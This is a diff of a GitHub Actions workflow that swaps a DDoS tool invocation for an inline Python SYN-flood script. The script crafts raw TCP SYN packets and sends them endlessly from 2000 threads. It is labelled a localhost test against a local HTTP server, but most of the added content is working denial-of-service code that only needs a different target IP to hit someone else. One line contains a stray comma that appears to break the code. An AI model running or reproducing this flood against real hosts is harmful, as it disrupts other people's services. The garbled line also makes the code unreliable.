@@ -1,4 +1,5 @@
-name: Run PYDDOS (Safe Localhost Test)
+# .github/workflows/ddos.yml
+name: SYN FLOOD TEST (Localhost)
 
 on:
   push:
@@ -6,8 +7,10 @@ on:
   workflow_dispatch:
 
 jobs:
-  ddos-test:
+  synflood:
     runs-on: ubuntu-latest
+    timeout-minutes: 2
+
     steps:
       - name: Checkout code
         uses: actions/checkout@v4
@@ -17,16 +20,103 @@ jobs:
         with:
           python-version: '3.12'
 
-      - name: Install dependencies
+      - name: Create synflood.py
         run: |
-          pip install termcolor colorama
+          cat > synflood.py << 'EOF'
+          #!/usr/bin/env python3
+          import socket
+          import struct
+          import random
+          import threading
+          import time
 
-      - name: Start test server
-        run: |
-          python -m http.server 8000 &
-          echo "Test server running on 127.0.0.1:8000"
+          def checksum(msg):
+              s = 0
+              for i in range(0, len(msg), 2):
+                  w = msg[i] | (msg[i+1] << 8)
+                  s += w
+              s = (s >> 16) + (s & 0xffff)
+              s = ~s & 0xffff
+              return s
 
-      - name: Run PYDDOS (Pyslow on localhost)
-        timeout-minutes: 1
+          def create_packet(dst_ip, dst_port):
+              ip_ihl = 5
+              ip_ver = 4
+              ip_tos = 0
+              ip_tot_len = 40
+             , ip_id = random.randint(1000, 9000)
+              ip_frag_off = 0
+              ip_ttl = 255
+              ip_proto = socket.IPPROTO_TCP
+              ip_check = 0
+              ip_saddr = socket.inet_aton("127.0.0.1")
+              ip_daddr = socket.inet_aton(dst_ip)
+
+              ip_ihl_ver = (ip_ver << 4) + ip_ihl
+              ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
+
+              tcp_source = random.randint(1024, 65535)
+              tcp_seq = 0
+              tcp_ack_seq = 0
+              tcp_doff = 5
+              tcp_syn = 1
+              tcp_window = socket.htons(5840)
+              tcp_check = 0
+              tcp_urg_ptr = 0
+
+              tcp_offset_res = (tcp_doff << 4)
+              tcp_flags = tcp_syn << 1
+
+              tcp_header = struct.pack('!HHLLBBHHH', tcp_source, dst_port, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
+
+              src_addr = socket.inet_aton("127.0.0.1")
+              dst_addr = socket.inet_aton(dst_ip)
+              placeholder = 0
+              protocol = socket.IPPROTO_TCP
+              tcp_length = len(tcp_header)
+
+              psh = struct.pack('!4s4sBBH', src_addr, dst_addr, placeholder, protocol, tcp_length)
+              psh += tcp_header
+              tcp_check = checksum(psh)
+
+              tcp_header = struct.pack('!HHLLBBHHH', tcp_source, dst_port, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
+
+              return ip_header + tcp_header
+
+          def syn_flood(target_ip, target_port):
+              s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+              s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+              count = 0
+              while True:
+                  try:
+                      packet = create_packet(target_ip, target_port)
+                      s.sendto(packet, (target_ip, 0))
+                      count += 1
+                      if count % 1000 == 0:
+                          print(f"[+] {count} SYN packets sent")
+                  except:
+                      pass
+
+          # Start server
+          import subprocess
+          import os
+          subprocess.Popen(["python3", "-m", "http.server", "8000"])
+          print("Test server running on 127.0.0.1:8000")
+          time.sleep(3)
+
+          # Launch 2000 threads
+          for _ in range(2000):
+              threading.Thread(target=syn_flood, args=("127.0.0.1", 8000), daemon=True).start()
+
+          # Keep alive
+          try:
+              while True:
+                  time.sleep(1)
+          except:
+              pass
+          EOF
+
+      - name: Run SYN Flood (Localhost)
         run: |
-          python pyddos.py -d 127.0.0.1 -p 8000 -T 2000 -Request -s 1
+          echo "STARTING SYN FLOOD — 2000 THREADS"
+          python3 synflood.py
